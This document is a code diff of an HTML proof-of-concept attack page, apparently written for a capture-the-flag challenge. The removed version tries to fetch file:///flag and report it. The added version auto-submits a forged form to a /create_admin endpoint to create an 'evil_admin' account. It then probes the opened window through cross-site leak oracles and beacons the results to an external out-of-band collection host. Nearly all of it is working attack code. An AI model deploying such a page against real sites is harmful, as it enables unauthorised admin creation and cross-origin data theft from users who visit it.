@@ -1,31 +1,83 @@
 <!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>redirect / token leak PoC</title>
+</head>
+<body>
+
 <script>
-const TARGET = 'https://tasks.goidactf.ru:20185';
-const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+const TARGET = "https://tasks.goidactf.ru:20385/create_admin";
+const OAST   = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
+const ADMIN  = "evil_admin";
 
-// XMLHttpRequest может отправить application/json
-const xhr = new XMLHttpRequest();
-xhr.open('POST', TARGET + '/get_url', true);
-xhr.setRequestHeader('Content-Type', 'application/json');
+/* helper */
+const log = d => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));
 
-xhr.onreadystatechange = function() {
-    if (xhr.readyState === 4) {
-        // Отправляем статус на коллаборатор
-        new Image().src = COLLAB + '/?xhr_status=' + xhr.status + '&ready=' + xhr.readyState;
-        
-        // Если получили ответ (даже если CORS блокирует чтение)
-        if (xhr.status === 200) {
-            // Пробуем прочитать
-            try {
-                const response = xhr.responseText;
-                if (response) {
-                    new Image().src = COLLAB + '/?xhr_response=' + 
-                                     encodeURIComponent(response.substring(0, 500));
-                }
-            } catch(e) {}
-        }
-    }
-};
+/*
+ 1. redirect / window oracle
+*/
+const w = window.open("", "leakwin");
 
-xhr.send(JSON.stringify({url: 'file:///flag'}));
+const f = document.createElement("form");
+f.method = "POST";
+f.action = TARGET;
+f.target = "leakwin";
+
+const i = document.createElement("input");
+i.name = "new_admin_login";
+i.value = ADMIN;
+
+f.appendChild(i);
+document.body.appendChild(f);
+f.submit();
+
+/*
+ 2. window.closed oracle
+*/
+setTimeout(() => {
+  log("closed=" + w.closed);
+}, 3000);
+
+/*
+ 3. window.name leak (часто забывают)
+*/
+setTimeout(() => {
+  let name;
+  try {
+    name = w.name;
+  } catch(e) {
+    name = "blocked";
+  }
+  log("window.name=" + name);
+}, 3500);
+
+/*
+ 4. title-based XS-leak (timing)
+*/
+let start = performance.now();
+setTimeout(() => {
+  let t;
+  try {
+    t = w.document.title;
+  } catch(e) {
+    t = "x-origin";
+  }
+  log("title=" + t + "|time=" + (performance.now() - start));
+}, 5000);
+
+/*
+ 5. fallback: detect redirect to attacker (open redirect)
+*/
+setTimeout(() => {
+  try {
+    log("location=" + w.location.href);
+  } catch(e) {
+    log("location=blocked");
+  }
+}, 7000);
+
 </script>
+
+</body>
+</html>
